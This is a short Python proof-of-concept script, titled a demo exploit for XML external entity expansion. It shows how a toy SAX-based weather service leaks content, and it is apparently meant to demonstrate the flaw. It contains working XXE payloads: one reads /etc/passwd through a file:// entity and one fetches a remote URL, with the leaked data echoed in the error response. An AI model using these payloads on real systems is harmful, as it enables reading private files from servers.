#!/usr/bin/python
"""Demo exploit for external entity expansion

Author: Christian Heimes
"""
import sys
from xml.sax import ContentHandler
from xml.sax import parseString

xml_good = """<weather>Aachen</weather>"""

xml_bad_file = """<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE weather [
<!ENTITY passwd SYSTEM "file:///etc/passwd">
]>
<weather>&passwd;</weather>
"""

xml_bad_url = """<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE weather [
<!ENTITY url SYSTEM "http://hg.python.org/cpython/raw-file/a11ddd687a0b/Lib/test/dh512.pem">
]>
<weather>&url;</weather>
"""


class WeatherHandler(ContentHandler):
    def __init__(self):
        ContentHandler.__init__(self)
        self.tag = "unseen"
        self.city = []

    def startElement(self, name, attrs):
        if name != "weather" or self.tag != "unseen":
            raise ValueError(name)
        self.tag = "processing"

    def endElement(self, name):
        self.tag = "seen"
        self.city = "".join(self.city)

    def characters(self, content):
        if self.tag == "processing":
           self.city.append(content)


def weatherResponse(xml):
    handler = WeatherHandler()
    parseString(xml, handler)
    if handler.city == "Aachen":
        return "<weather>The weather in %s is terrible.</weather" % handler.city
    else:
        return "<error>Unknown city %s</error>" % handler.city[:500]

for xml in (xml_good, xml_bad_file, xml_bad_url):
    print("\nREQUEST:\n--------")
    print(xml)
    print("\nRESPONSE:\n---------")
    print(weatherResponse(xml))
    print("")
